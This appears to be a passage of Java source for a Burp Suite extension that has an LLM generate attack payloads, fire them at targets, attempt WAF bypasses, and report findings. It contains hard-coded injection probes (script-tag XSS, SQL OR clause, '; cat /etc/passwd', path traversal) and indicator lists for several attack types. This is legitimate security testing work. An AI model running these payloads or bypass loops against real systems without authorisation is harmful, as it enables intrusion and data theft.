                        performSmartFuzzing(exchange, requestResponse, waf, adaptive);
                    } finally {
                        activeScansRunning.decrementAndGet();
                    }
                });
            } catch (RejectedExecutionException ignored) {
                // Queue full
            }
        }

        return Collections.emptyList();
    }

    // ==================== Passive Analysis ====================

    private void analyzeWithLlm(CapturedHttpExchange exchange, HttpRequestResponse reqResp) {
        analyzeWithLlm(exchange, reqResp, null);
    }

    private void analyzeWithLlm(CapturedHttpExchange exchange, HttpRequestResponse reqResp, String targetModuleId) {
        if (cancelled) return;
        queuedCount.set(getQueueSize());
        try {
            // Build enriched prompt with tech stack context (Improvement 3)
            StringBuilder promptBuilder = new StringBuilder(buildAnalysisPrompt(targetModuleId));

            // Improvement 3: Tech stack context
            String techContext = buildTechStackContext(reqResp);
            if (!techContext.isEmpty()) promptBuilder.append(techContext);

            // Improvement 4: Session findings context
            String sessionContext = buildSessionFindingsContext();
            if (!sessionContext.isEmpty()) promptBuilder.append(sessionContext);

            // Improvement 7: Trim exchange text to fit budget
            String exchangeText = exchange.toPromptText();
            int remaining = CONTEXT_CHAR_BUDGET - promptBuilder.length();
            if (exchangeText.length() > remaining && remaining > 1000) {
                exchangeText = trimToTokenBudget(exchangeText, remaining);
            }
            promptBuilder.append(exchangeText);

            String prompt = promptBuilder.toString();
            trackInputTokens(prompt);
            logInfo(">>> Sending passive analysis request to " + llmClient.getProvider().getDisplayName()
                    + " (model: " + llmClient.getModel() + ") for " + exchange.getUrl()
                    + " | prompt size: " + prompt.length() + " chars"
                    + (targetModuleId != null ? " | module: " + targetModuleId : ""));
            long startMs = System.currentTimeMillis();

            // Improvement 9: Structured output enforcement with retry
            String rawResponse = callWithRetry(prompt);
            long elapsedMs = System.currentTimeMillis() - startMs;
            logInfo("<<< AI response received in " + elapsedMs + "ms | response size: "
                    + (rawResponse != null ? rawResponse.length() : 0) + " chars");
            LlmAnalysisResult result = llmClient.parseResponse(rawResponse);

            logInfo("Parsed " + result.getFindings().size() + " findings from AI response for " + exchange.getUrl());
            if (result.getFindings().isEmpty()) {
                logInfo("AI returned no findings. Raw response (first 500 chars): "
                        + (rawResponse != null ? rawResponse.substring(0, Math.min(rawResponse.length(), 500)) : "null"));
            }

            analyzedCount.incrementAndGet();

            for (LlmAnalysisResult.LlmFinding llmFinding : result.getFindings()) {
                Severity severity = parseSeverity(llmFinding.getSeverity());

                String title = llmFinding.getTitle();
                if (llmFinding.getCweId() != null && !llmFinding.getCweId().isEmpty()) {
                    title += " (" + llmFinding.getCweId() + ")";
                }

                String ev = llmFinding.getEvidence() != null ? llmFinding.getEvidence() : "";
                if (llmFinding.getPoc() != null && !llmFinding.getPoc().isEmpty()) {
                    ev = ev + "\n\n--- Proof of Concept ---\n" + llmFinding.getPoc();
                }

                Finding.Builder fb = Finding.builder("ai-vuln-analyzer", title, severity, Confidence.FIRM)
                        .targetModuleId(targetModuleId)
                        .url(exchange.getUrl())
                        .evidence(ev)
                        .responseEvidence(llmFinding.getEvidence())
                        .description("[AI Analysis] " + llmFinding.getDescription())
                        .remediation(llmFinding.getRemediation());

                if (reqResp != null) {
                    fb.requestResponse(reqResp);
                }

                findingsStore.addFinding(fb.build());
                findingsCount.incrementAndGet();
            }
        } catch (LlmException e) {
            errorCount.incrementAndGet();
            logError(e.getErrorType() + " - " + e.getMessage());
        } catch (Exception e) {
            errorCount.incrementAndGet();
            logError("Unexpected error - " + e.getMessage());
        }
        queuedCount.set(getQueueSize());
    }

    // ==================== Smart Fuzzing ====================

    private void performSmartFuzzing(CapturedHttpExchange exchange, HttpRequestResponse originalReqResp,
                                      boolean wafBypass, boolean adaptiveScan) {
        performSmartFuzzing(exchange, originalReqResp, wafBypass, adaptiveScan, null, null);
    }

    private void performSmartFuzzing(CapturedHttpExchange exchange, HttpRequestResponse originalReqResp,
                                      boolean wafBypass, boolean adaptiveScan, String targetModuleId) {
        performSmartFuzzing(exchange, originalReqResp, wafBypass, adaptiveScan, targetModuleId, null);
    }

    private void performSmartFuzzing(CapturedHttpExchange exchange, HttpRequestResponse originalReqResp,
                                      boolean wafBypass, boolean adaptiveScan,
                                      String targetModuleId, String targetParameter) {
        if (cancelled) return;
        try {
            logInfo("Smart Fuzzing: Requesting payloads for " + exchange.getUrl()
                    + (targetParameter != null ? " [param: " + targetParameter + "]" : ""));

            // Improvement 6: Rate limit check before starting
            if (!waitForRateLimit(exchange.getUrl())) return;

            // Improvement 1: WAF fingerprinting before fuzzing
            String wafContext = "";
            if (targetParameter != null && !targetParameter.isEmpty()) {
                String injPoint = "query"; // default
                WafFingerprint fp = getOrBuildWafFingerprint(originalReqResp.request(),
                        targetParameter, injPoint);
                wafContext = fp.toPromptText();
            }

            // Improvement 3: Technology stack context
            String techContext = buildTechStackContext(originalReqResp);

            // Improvement 4: Session findings context
            String sessionContext = buildSessionFindingsContext();

            // Improvement 8: Static scanner dedup
            String dedupContext = buildStaticScannerDedup(exchange.getUrl(), targetModuleId);

            // Step 1: Ask LLM for targeted payloads
            String paramConstraint = "";
            if (targetParameter != null) {
                paramConstraint = "\nIMPORTANT: Only test the parameter named '" + targetParameter
                        + "'. Do not generate payloads for other parameters. "
                        + "Every payload MUST have \"parameter\": \"" + targetParameter + "\".\n\n";
            }

            // Build enriched prompt with all context
            String basePrompt = buildFuzzPrompt(targetModuleId);
            StringBuilder enrichedPrompt = new StringBuilder(basePrompt);
            if (!wafContext.isEmpty()) enrichedPrompt.append(wafContext);
            if (!techContext.isEmpty()) enrichedPrompt.append(techContext);
            if (!sessionContext.isEmpty()) enrichedPrompt.append(sessionContext);
            if (!dedupContext.isEmpty()) enrichedPrompt.append(dedupContext);
            enrichedPrompt.append(paramConstraint);

            // Improvement 7: Trim the exchange text to fit token budget
            String exchangeText = exchange.toPromptText();
            int remaining = CONTEXT_CHAR_BUDGET - enrichedPrompt.length();
            if (exchangeText.length() > remaining && remaining > 1000) {
                exchangeText = trimToTokenBudget(exchangeText, remaining);
            }
            enrichedPrompt.append(exchangeText);

            String prompt = enrichedPrompt.toString();
            trackInputTokens(prompt);
            logInfo(">>> Sending fuzz request to " + llmClient.getProvider().getDisplayName()
                    + " (model: " + llmClient.getModel() + ") | prompt size: " + prompt.length() + " chars"
                    + " | est. cost: " + getCostSummary()
                    + (targetModuleId != null ? " | module: " + targetModuleId : ""));
            long startMs = System.currentTimeMillis();

            // Improvement 9: Structured output enforcement with retry
            String rawResponse = callWithRetry(prompt);
            long elapsedMs = System.currentTimeMillis() - startMs;
            logInfo("<<< AI fuzz response received in " + elapsedMs + "ms | response size: "
                    + (rawResponse != null ? rawResponse.length() : 0) + " chars");

            if (cancelled) { logInfo("Smart Fuzzing: Cancelled."); return; }

            List<FuzzPayload> payloads = parseFuzzPayloads(rawResponse);

            // When scanning for a specific module, drop any payloads the AI generated
            // for the wrong vulnerability type (e.g., XSS payloads during SSRF scan)
            if (targetModuleId != null) {
                String expectedType = getAttackType(targetModuleId);
                int beforeFilter = payloads.size();
                payloads.removeIf(p -> !isMatchingAttackType(p.attackType, expectedType));
                int dropped = beforeFilter - payloads.size();
                if (dropped > 0) {
                    logInfo("Smart Fuzzing: Filtered out " + dropped + " off-target payload(s) "
                            + "(expected: " + expectedType + ", target: " + targetModuleId + ")");
                }
            }

            // When targeting a specific parameter, drop payloads for other parameters
            if (targetParameter != null) {
                int beforeParamFilter = payloads.size();
                payloads.removeIf(p -> p.parameter != null
                        && !p.parameter.isEmpty()
                        && !p.parameter.equalsIgnoreCase(targetParameter));
                int dropped = beforeParamFilter - payloads.size();
                if (dropped > 0) {
                    logInfo("Smart Fuzzing: Filtered out " + dropped + " off-parameter payload(s) "
                            + "(expected: " + targetParameter + ")");
                }
            }

            if (payloads.isEmpty()) {
                logInfo("Smart Fuzzing: No payloads generated for " + exchange.getUrl());
                return;
            }

            logInfo("Smart Fuzzing: Testing " + payloads.size() + " payloads against " + exchange.getUrl());

            // Step 2: Send each payload and collect results
            List<FuzzResult> allResults = new ArrayList<>();
            for (FuzzPayload payload : payloads) {
                if (cancelled) { logInfo("Smart Fuzzing: Cancelled mid-scan."); return; }

                // Improvement 6: Rate limit check before each request
                if (!waitForRateLimit(exchange.getUrl())) {
                    logInfo("Smart Fuzzing: Halted due to rate limiting/IP block.");
                    break;
                }

                try {
                    // AtomicReference lets the OOB callback access the response after sendRequest
                    AtomicReference<HttpRequestResponse> reqRespRef = new AtomicReference<>();
                    // Replace {COLLAB} placeholders with real tracked Collaborator payloads
                    FuzzPayload resolvedPayload = resolveCollaboratorPlaceholders(payload, exchange.getUrl(), reqRespRef, targetModuleId);
                    HttpRequest modified = injectPayload(originalReqResp.request(), resolvedPayload);
                    long startTime = System.currentTimeMillis();
                    HttpRequestResponse response = api.http().sendRequest(modified);
                    long elapsed = System.currentTimeMillis() - startTime;
                    reqRespRef.set(response); // Now OOB callback can read the request/response
                    fuzzRequestsSent.incrementAndGet();

                    // Improvement 6: Track response for rate limiting
                    trackRateLimit(exchange.getUrl(), response);

                    boolean wafDetected = isWafBlocked(response);
                    FuzzResult result = new FuzzResult(resolvedPayload, response, wafDetected, elapsed);
                    allResults.add(result);

                    // Check for immediate vulnerability indicators
                    checkForVulnIndicators(result, exchange.getUrl(), targetModuleId);

                    // Step 3: WAF bypass if blocked
                    if (wafBypass && wafDetected && !cancelled) {
                        logInfo("Smart Fuzzing: WAF detected for payload [" + resolvedPayload.attackType + "], attempting bypass");
                        List<FuzzResult> bypassResults = performWafBypass(
                                originalReqResp.request(), resolvedPayload, response, targetModuleId);
                        allResults.addAll(bypassResults);
                    }
                } catch (Exception e) {
                    errorCount.incrementAndGet();
                    logError("Smart Fuzzing: Error sending payload - " + e.getMessage());
                }
            }

            // Step 4: Adaptive scanning — Improvement 2: max 5 rounds, stop after 3 with no progress
            if (adaptiveScan && !allResults.isEmpty() && !cancelled) {
                int round = 1;
                int roundsWithNoProgress = 0;
                int previousFindingsCount = findingsCount.get();
                final int maxAdaptiveRounds = 5;
                final int noProgressThreshold = 3;

                while (!cancelled && round <= maxAdaptiveRounds) {
                    // Improvement 6: Rate limit check before each round
                    if (!waitForRateLimit(exchange.getUrl())) break;

                    List<FuzzResult> adaptiveResults = performAdaptiveRound(
                            originalReqResp.request(), allResults, round, targetModuleId);
                    if (adaptiveResults.isEmpty()) break;
                    allResults.addAll(adaptiveResults);

                    // Check if this round produced new findings
                    int currentFindings = findingsCount.get();
                    if (currentFindings == previousFindingsCount) {
                        roundsWithNoProgress++;
                        if (roundsWithNoProgress >= noProgressThreshold) {
                            logInfo("Adaptive Scan: Stopping — no progress after " + roundsWithNoProgress
                                    + " rounds. Reporting WAF fingerprint if applicable.");
                            // Report WAF fingerprint as INFO finding if WAF was detected
                            String host = extractHost(exchange.getUrl());
                            WafFingerprint fp = wafFingerprints.get(host);
                            if (fp != null && fp.wafDetected) {
                                findingsStore.addFinding(Finding.builder("ai-vuln-analyzer",
                                                "WAF Fingerprint — All Payloads Blocked", Severity.INFO, Confidence.FIRM)
                                        .url(exchange.getUrl())
                                        .evidence(fp.toPromptText())
                                        .description("[AI Adaptive] WAF blocked all payloads after " + round
                                                + " adaptive rounds. " + fp.blockedProbes.size() + " probe types blocked.")
                                        .build());
                            }
                            break;
                        }
                    } else {
                        roundsWithNoProgress = 0;
                        previousFindingsCount = currentFindings;
                    }
                    round++;
                }
                if (round > maxAdaptiveRounds) {
                    logInfo("Adaptive Scan: Reached max rounds (" + maxAdaptiveRounds + ")");
                }
            }

            if (cancelled) { logInfo("Smart Fuzzing: Cancelled."); return; }

            // Step 5: Final analysis — ask LLM to analyze all results
            analyzeFuzzResults(exchange.getUrl(), allResults, originalReqResp, targetModuleId);

            analyzedCount.incrementAndGet();
            logInfo("Smart Fuzzing: Completed for " + exchange.getUrl()
                    + " (" + allResults.size() + " total test requests)");

        } catch (LlmException e) {
            errorCount.incrementAndGet();
            logError("Smart Fuzzing: LLM error - " + e.getErrorType() + " - " + e.getMessage());
        } catch (Exception e) {
            errorCount.incrementAndGet();
            logError("Smart Fuzzing: Unexpected error - " + e.getMessage());
        }
    }

    // ==================== WAF Bypass ====================

    private List<FuzzResult> performWafBypass(HttpRequest originalRequest,
                                               FuzzPayload blockedPayload,
                                               HttpRequestResponse wafResponse,
                                               String targetModuleId) {
        List<FuzzResult> results = new ArrayList<>();
        if (cancelled) return results;
        try {
            String wafSnippet = "";
            if (wafResponse.response() != null) {
                String body = wafResponse.response().bodyToString();
                wafSnippet = body != null ? truncate(body, 500) : "";
            }

            String prompt = String.format(WAF_BYPASS_PROMPT,
                    blockedPayload.payload,
                    blockedPayload.parameter,
                    blockedPayload.attackType,
                    wafResponse.response() != null ? wafResponse.response().statusCode() : 0,
                    wafSnippet);

            String rawResponse = llmClient.call(prompt);
            List<WafBypass> bypasses = parseWafBypasses(rawResponse);

            for (WafBypass bypass : bypasses) {
                if (cancelled) break;
                try {
                    AtomicReference<HttpRequestResponse> reqRespRef = new AtomicReference<>();
                    FuzzPayload bypassPayload = resolveCollaboratorPlaceholders(
                            new FuzzPayload(
                                    blockedPayload.parameter,
                                    blockedPayload.injectionPoint,
                                    bypass.payload,
                                    blockedPayload.attackType,
                                    "WAF bypass [" + bypass.technique + "]: " + bypass.description
                            ), originalRequest.url(), reqRespRef, targetModuleId);

                    HttpRequest modified = injectPayload(originalRequest, bypassPayload);
                    long startTime = System.currentTimeMillis();
                    HttpRequestResponse response = api.http().sendRequest(modified);
                    long elapsed = System.currentTimeMillis() - startTime;
                    reqRespRef.set(response);
                    fuzzRequestsSent.incrementAndGet();

                    boolean stillBlocked = isWafBlocked(response);
                    FuzzResult result = new FuzzResult(bypassPayload, response, stillBlocked, elapsed);
                    results.add(result);

                    if (!stillBlocked) {
                        logInfo("WAF Bypass: Successfully bypassed with [" + bypass.technique + "]");
                        checkForVulnIndicators(result, originalRequest.url(), targetModuleId);
                    }
                } catch (Exception e) {
                    errorCount.incrementAndGet();
                }
            }
        } catch (LlmException e) {
            errorCount.incrementAndGet();
            logError("WAF Bypass: LLM error - " + e.getMessage());
        }
        return results;
    }

    // ==================== Adaptive Scanning ====================

    private List<FuzzResult> performAdaptiveRound(HttpRequest originalRequest,
                                                    List<FuzzResult> previousResults,
                                                    int round,
                                                    String targetModuleId) {
        List<FuzzResult> results = new ArrayList<>();
        if (cancelled) return results;
        try {
            logInfo("Adaptive Scan: Round " + round + " — analyzing " + previousResults.size() + " previous results");

            String resultsSummary = formatResultsForLlm(previousResults);

            // Improvement 6: Include rate limit context if we've been throttled
            String host = extractHost(originalRequest.url());
            RateLimitTracker tracker = rateLimitTrackers.get(host);
            String rateLimitNote = "";
            if (tracker != null && tracker.consecutive429s > 0) {
                rateLimitNote = "\nNOTE: Target is rate-limiting. Generate fewer, higher-quality payloads — "
                        + "maximum 5 per round instead of 20. Current delay: " + tracker.currentDelayMs + "ms.\n";
            }

            String prompt = String.format(ADAPTIVE_PROMPT, resultsSummary) + rateLimitNote;
            trackInputTokens(prompt);

            // Improvement 9: Structured output enforcement
            String rawResponse = callWithRetry(prompt);
            List<FuzzPayload> payloads = parseFuzzPayloads(rawResponse);

            // Filter off-target payloads in adaptive rounds too
            if (targetModuleId != null) {
                String expectedType = getAttackType(targetModuleId);
                payloads.removeIf(p -> !isMatchingAttackType(p.attackType, expectedType));
            }

            if (payloads.isEmpty()) {
                logInfo("Adaptive Scan: No additional payloads for round " + round);
                return results;
            }

            logInfo("Adaptive Scan: Round " + round + " — testing " + payloads.size() + " payloads");

            for (FuzzPayload payload : payloads) {
                if (cancelled) break;
                // Improvement 6: Rate limit check
                if (!waitForRateLimit(originalRequest.url())) break;

                try {
                    AtomicReference<HttpRequestResponse> reqRespRef = new AtomicReference<>();
                    FuzzPayload resolved = resolveCollaboratorPlaceholders(payload, originalRequest.url(), reqRespRef, targetModuleId);
                    HttpRequest modified = injectPayload(originalRequest, resolved);
                    long startTime = System.currentTimeMillis();
                    HttpRequestResponse response = api.http().sendRequest(modified);
                    long elapsed = System.currentTimeMillis() - startTime;
                    reqRespRef.set(response);
                    fuzzRequestsSent.incrementAndGet();
                    trackRateLimit(originalRequest.url(), response);

                    boolean wafDetected = isWafBlocked(response);
                    FuzzResult result = new FuzzResult(resolved, response, wafDetected, elapsed);
                    results.add(result);
                    checkForVulnIndicators(result, originalRequest.url(), targetModuleId);
                } catch (Exception e) {
                    errorCount.incrementAndGet();
                }
            }
        } catch (LlmException e) {
            errorCount.incrementAndGet();
            logError("Adaptive Scan: LLM error - " + e.getMessage());
        }
        return results;
    }

    // ==================== Result Analysis ====================

    /**
     * Checks a single fuzz result for common vulnerability indicators
     * (error messages, reflection, time delays) and reports immediately.
     */
    private void checkForVulnIndicators(FuzzResult result, String url, String targetModuleId) {
        if (result.response == null || result.response.response() == null) return;

        String body = result.response.response().bodyToString();
        if (body == null) return;
        String bodyLower = body.toLowerCase();
        int status = result.response.response().statusCode();

        // SQL error indicators
        if (result.payload.attackType.equals("sqli")) {
            for (String indicator : List.of("sql syntax", "mysql", "postgresql", "oracle",
                    "sqlite", "unclosed quotation", "unterminated string",
                    "you have an error in your sql", "warning: mysql", "pg_query",
                    "odbc", "jdbc", "sqlexception", "syntax error at or near")) {
                if (bodyLower.contains(indicator)) {
                    reportFuzzFinding(result, url, targetModuleId, Severity.HIGH, Confidence.FIRM,
                            "SQL Injection — database error triggered",
                            "Database error '" + indicator + "' found in response after injecting: "
                                    + truncate(result.payload.payload, 200));
                    return;
                }
            }
            // Time-based blind SQLi: payload contains SLEEP/WAITFOR/pg_sleep AND response took >5s
            if (result.responseTimeMs > 5000) {
                String payloadLower = result.payload.payload.toLowerCase();
                if (payloadLower.contains("sleep") || payloadLower.contains("waitfor")
                        || payloadLower.contains("pg_sleep") || payloadLower.contains("benchmark")) {
                    reportFuzzFinding(result, url, targetModuleId, Severity.HIGH, Confidence.TENTATIVE,
                            "Possible Blind SQL Injection — time delay detected",
                            "Response took " + result.responseTimeMs + "ms after time-based payload: "
                                    + truncate(result.payload.payload, 200));
                    return;
                }
            }
        }

        // XSS reflection — only check if the actual injected payload is reflected verbatim
        if (result.payload.attackType.equals("xss")) {
            if (body.contains(result.payload.payload)) {
                reportFuzzFinding(result, url, targetModuleId, Severity.HIGH, Confidence.FIRM,
                        "Reflected XSS — payload reflected unescaped in response",
                        "Injected payload reflected verbatim in response body: "
                                + truncate(result.payload.payload, 200));
                return;
            }
        }

        // Command injection indicators — use specific OS output patterns, not generic words
        if (result.payload.attackType.equals("cmdi")) {
            for (String indicator : List.of("root:x:0:0:", "uid=0(root)", "uid=",
                    "volume serial number", "/bin/bash", "/bin/sh")) {
                if (bodyLower.contains(indicator)) {
                    reportFuzzFinding(result, url, targetModuleId, Severity.CRITICAL, Confidence.FIRM,
                            "Command Injection — OS command output detected",
                            "OS-level output '" + indicator + "' detected after injecting: "
                                    + truncate(result.payload.payload, 200));
                    return;
                }
            }
            // Time-based blind command injection
            if (result.responseTimeMs > 5000) {
                String payloadLower = result.payload.payload.toLowerCase();
                if (payloadLower.contains("sleep") || payloadLower.contains("ping")
                        || payloadLower.contains("timeout")) {
                    reportFuzzFinding(result, url, targetModuleId, Severity.HIGH, Confidence.TENTATIVE,
                            "Possible Blind Command Injection — time delay detected",
                            "Response took " + result.responseTimeMs + "ms after time-based payload: "
                                    + truncate(result.payload.payload, 200));
                    return;
                }
            }
        }

        // SSTI indicators — use large unique math canaries that never appear naturally
        if (result.payload.attackType.equals("ssti")) {
            var mathCanaries = Map.of(
                    "133*991", "131803",
                    "7739*397", "3072383",
                    "9281*473", "4389913",
                    "8123*547", "4443281",
                    "3571*661", "2360431"
            );
            for (var entry : mathCanaries.entrySet()) {
                if (result.payload.payload.contains(entry.getKey()) && body.contains(entry.getValue())) {
                    reportFuzzFinding(result, url, targetModuleId, Severity.CRITICAL, Confidence.FIRM,
                            "Server-Side Template Injection — math expression evaluated",
                            "Template expression '" + entry.getKey() + "' evaluated to '"
                                    + entry.getValue() + "' in response. Payload: "
                                    + truncate(result.payload.payload, 200));
                    return;
                }
            }
        }

        // Path traversal indicators — use specific file content patterns, not generic XML/HTML
        if (result.payload.attackType.equals("path_traversal")) {
            for (String indicator : List.of("root:x:0:0:", "[boot loader]",
                    "[extensions]", "[fonts]", "PATH=", "HOME=")) {
                if (bodyLower.contains(indicator) && status == 200) {
                    reportFuzzFinding(result, url, targetModuleId, Severity.HIGH, Confidence.FIRM,
                            "Path Traversal — file content leaked",
                            "File content indicator '" + indicator + "' found after injecting: "
                                    + truncate(result.payload.payload, 200));
                    return;
                }
            }
        }

        // SSRF indicators
        if (result.payload.attackType.equals("ssrf")) {
            for (String indicator : List.of("ami-", "instance-id", "metadata",
                    "169.254.169.254", "127.0.0.1", "localhost")) {
                if (bodyLower.contains(indicator) && !result.wafDetected) {
                    reportFuzzFinding(result, url, targetModuleId, Severity.HIGH, Confidence.TENTATIVE,
                            "Possible SSRF — internal resource indicator in response",
                            "Internal indicator '" + indicator + "' found after injecting: "
                                    + truncate(result.payload.payload, 200));
                    return;
                }
            }
        }
    }

    /**
     * Sends all fuzz results to the LLM for comprehensive analysis.
     */
    private void analyzeFuzzResults(String url, List<FuzzResult> results,
                                     HttpRequestResponse originalReqResp,
                                     String targetModuleId) {
        if (results.isEmpty()) return;

        try {
            String summary = formatResultsForLlm(results);
            String prompt = """
                    You are a senior penetration tester analyzing the results of automated security testing.
                    Review these test results and identify CONFIRMED vulnerabilities only.

                    CRITICAL: Only report findings where you have concrete proof — exact error messages,
                    reflected payloads, computed expressions, leaked file contents, or other verifiable evidence.
                    For every finding, include a copy-paste-ready PoC in the "poc" field (full URL, curl command, or payload).
                    POC or nothing. Do NOT report speculative or theoretical issues.

                    Respond ONLY with valid JSON:
                    {"findings": [{"title": "Brief title", "severity": "CRITICAL|HIGH|MEDIUM|LOW|INFO", "description": "What the vulnerability is and how it was confirmed", "evidence": "The specific response content that confirms the vulnerability", "poc": "Copy-paste-ready PoC URL, curl command, or payload", "remediation": "How to fix", "cwe": "CWE-XXX"}]}

                    Test Results:
                    """ + summary;

            String rawResponse = llmClient.call(prompt);
            LlmAnalysisResult result = llmClient.parseResponse(rawResponse);

            for (LlmAnalysisResult.LlmFinding llmFinding : result.getFindings()) {
                Severity severity = parseSeverity(llmFinding.getSeverity());
                String title = llmFinding.getTitle();
                if (llmFinding.getCweId() != null && !llmFinding.getCweId().isEmpty()) {
                    title += " (" + llmFinding.getCweId() + ")";
                }

                String fuzzEv = llmFinding.getEvidence() != null ? llmFinding.getEvidence() : "";
                if (llmFinding.getPoc() != null && !llmFinding.getPoc().isEmpty()) {
                    fuzzEv = fuzzEv + "\n\n--- Proof of Concept ---\n" + llmFinding.getPoc();
                }

                Finding finding = Finding.builder("ai-vuln-analyzer", title, severity, Confidence.FIRM)
                        .targetModuleId(targetModuleId)
                        .url(url)
                        .evidence(fuzzEv)
                        .responseEvidence(llmFinding.getEvidence())
                        .description("[AI Smart Fuzz] " + llmFinding.getDescription())
                        .remediation(llmFinding.getRemediation())
                        .requestResponse(originalReqResp)
                        .build();

                findingsStore.addFinding(finding);
                findingsCount.incrementAndGet();
            }
        } catch (Exception e) {
            errorCount.incrementAndGet();
            logError("Fuzz Analysis: Error analyzing results - " + e.getMessage());
        }
    }

    private void reportFuzzFinding(FuzzResult result, String url, String targetModuleId,
                                    Severity severity, Confidence confidence,
                                    String title, String evidence) {
        Finding finding = Finding.builder("ai-vuln-analyzer", title, severity, confidence)
                .targetModuleId(targetModuleId)
                .url(url)
                .parameter(result.payload.parameter)
                .evidence(evidence)
                .payload(result.payload.payload)
                .responseEvidence(evidence)
                .description("[AI Smart Fuzz] " + result.payload.description)
                .requestResponse(result.response)
                .build();

        findingsStore.addFinding(finding);
        findingsCount.incrementAndGet();

        // Improvement 4: Record confirmed finding in session context for future prompts
        if (severity == Severity.HIGH || severity == Severity.CRITICAL) {
            recordConfirmedFinding(result.payload.attackType, result.payload.parameter,
                    url, result.payload.payload, evidence);
        }
    }

    // ==================== Collaborator Integration ====================

    private static final String COLLAB_PLACEHOLDER = "{COLLAB}";

    /**
     * Replaces {COLLAB} placeholders in a payload with real tracked Collaborator URLs.
     * Each {COLLAB} occurrence gets a unique Collaborator subdomain with a callback
     * that reports OOB findings when an interaction is received.
     *
     * @param reqRespRef AtomicReference that will be populated with the HttpRequestResponse
     *                   after the fuzz request is sent. The OOB callback reads this so the
     *                   finding includes the request/response (for Repeater, Dashboard, etc.).
     */
    private FuzzPayload resolveCollaboratorPlaceholders(FuzzPayload payload, String targetUrl,
                                                         AtomicReference<HttpRequestResponse> reqRespRef,
                                                         String targetModuleId) {
        if (!payload.payload.contains(COLLAB_PLACEHOLDER)
                || collaboratorManager == null || !collaboratorManager.isAvailable()) {
            return payload; // No placeholder or no Collaborator — return as-is
        }

        String resolvedPayload = payload.payload;
        // Replace each {COLLAB} with a unique tracked Collaborator payload
        while (resolvedPayload.contains(COLLAB_PLACEHOLDER)) {
            String collabPayload = collaboratorManager.generatePayload(
                    "ai-vuln-analyzer",
                    targetUrl,
                    payload.parameter,
                    "AI " + payload.attackType + " OOB: " + payload.description,
                    interaction -> {
                        // OOB interaction received — report as a confirmed finding
                        logInfo("OOB CONFIRMED: " + payload.attackType.toUpperCase()
                                + " interaction received from " + interaction.clientIp()
                                + " | type: " + interaction.type()
                                + " | param: " + payload.parameter);

                        Finding.Builder fb = Finding.builder("ai-vuln-analyzer",
                                        "OOB " + payload.attackType.toUpperCase()
                                                + " Confirmed via Collaborator (" + interaction.type() + ")",
                                        Severity.HIGH, Confidence.CERTAIN)
                                .targetModuleId(targetModuleId)
                                .url(targetUrl)
                                .parameter(payload.parameter)
                                .payload(payload.payload)
                                .evidence("Collaborator " + interaction.type() + " interaction received from "
                                        + interaction.clientIp() + " after injecting AI-generated "
                                        + payload.attackType + " payload into parameter '"
                                        + payload.parameter + "': " + truncate(payload.payload, 200))
                                .description("[AI OOB] " + payload.description
                                        + ". Out-of-band interaction confirms the server processed the payload.")
                                .remediation("The application is vulnerable to " + payload.attackType
                                        + ". The OOB callback proves server-side execution of the injected payload.");

                        // Attach the request/response so the finding can be sent to Repeater
                        HttpRequestResponse rr = reqRespRef.get();
                        if (rr != null) {
                            fb.requestResponse(rr);
                        }

                        findingsStore.addFinding(fb.build());
                        findingsCount.incrementAndGet();
                    });

            if (collabPayload == null) {
                // Collaborator failed — remove placeholder and skip OOB
                resolvedPayload = resolvedPayload.replace(COLLAB_PLACEHOLDER, "oob-test.invalid");
                break;
            }

            // Replace only the first occurrence per iteration
            resolvedPayload = resolvedPayload.replaceFirst(
                    java.util.regex.Pattern.quote(COLLAB_PLACEHOLDER), collabPayload);
        }

        return new FuzzPayload(payload.parameter, payload.injectionPoint,
                resolvedPayload, payload.attackType, payload.description);
    }

    // ==================== Request modification ====================

    private HttpRequest injectPayload(HttpRequest original, FuzzPayload payload) {
        return switch (payload.injectionPoint.toLowerCase()) {
            case "query", "url" -> original.withParameter(
                    HttpParameter.parameter(payload.parameter, PayloadEncoder.encode(payload.payload), HttpParameterType.URL));
            case "body" -> original.withParameter(
                    HttpParameter.parameter(payload.parameter, PayloadEncoder.encode(payload.payload), HttpParameterType.BODY));
            case "header" -> original
                    .withRemovedHeader(payload.parameter)
                    .withAddedHeader(payload.parameter, payload.payload);
            case "cookie" -> original
                    .withRemovedHeader("Cookie")
                    .withAddedHeader("Cookie", payload.parameter + "=" + payload.payload);
            default -> original.withParameter(
                    HttpParameter.parameter(payload.parameter, PayloadEncoder.encode(payload.payload), HttpParameterType.URL));
        };
    }

    // ==================== WAF Detection ====================

    private boolean isWafBlocked(HttpRequestResponse response) {
        if (response == null || response.response() == null) return false;
        int status = response.response().statusCode();

        // Common WAF status codes
        if (status == 403 || status == 406 || status == 429 || status == 503) {
            String body = response.response().bodyToString();
            if (body != null) {
                String bodyLower = body.toLowerCase();
                for (String sig : WAF_SIGNATURES) {
                    if (bodyLower.contains(sig)) return true;
                }
            }
            // 403 alone is a strong WAF indicator when testing payloads
            if (status == 403) return true;
        }
        return false;
    }

    // ==================== WAF Fingerprinting (Improvement 1) ====================

    private static final String[] WAF_PROBE_PAYLOADS = {
            "<script>alert(1)</script>",
            "' OR 1=1-- -",
            "{{7*7}}",
            "; cat /etc/passwd",
            "../../../../etc/passwd"
    };
    private static final String[] WAF_PROBE_LABELS = {
            "XSS <script>", "SQLi OR", "SSTI {{7*7}}", "CMDi cat", "Path traversal"
    };
    private static final List<String> WAF_INDICATOR_HEADERS = List.of(
            "X-WAF-Action", "X-CDN", "CF-RAY", "X-Sucuri-ID", "X-Amz-Cf-Id",
            "X-Akamai-Session", "Server"
    );

    /**
     * Probes the target parameter with 5 known-bad payloads to build a WAF fingerprint.
     * Cached per host — returns existing fingerprint if available.
     */
    private WafFingerprint getOrBuildWafFingerprint(HttpRequest originalRequest, String parameterName,
                                                      String injectionPoint) {
        String host = extractHost(originalRequest.url());
        WafFingerprint cached = wafFingerprints.get(host);
        if (cached != null && (System.currentTimeMillis() - cached.createdAt) < 300_000) { // 5 min TTL
            logInfo("WAF Fingerprint: Using cached fingerprint for " + host);
            return cached;
        }

        logInfo("WAF Fingerprint: Probing " + host + " with " + WAF_PROBE_PAYLOADS.length + " probes...");
        WafFingerprint fp = new WafFingerprint();

        for (int i = 0; i < WAF_PROBE_PAYLOADS.length; i++) {
            if (cancelled) break;
            try {
                FuzzPayload probe = new FuzzPayload(
                        parameterName, injectionPoint, WAF_PROBE_PAYLOADS[i], "probe", WAF_PROBE_LABELS[i]);
                HttpRequest modified = injectPayload(originalRequest, probe);
                HttpRequestResponse response = api.http().sendRequest(modified);
                fuzzRequestsSent.incrementAndGet();

                if (response.response() != null) {
                    int status = response.response().statusCode();
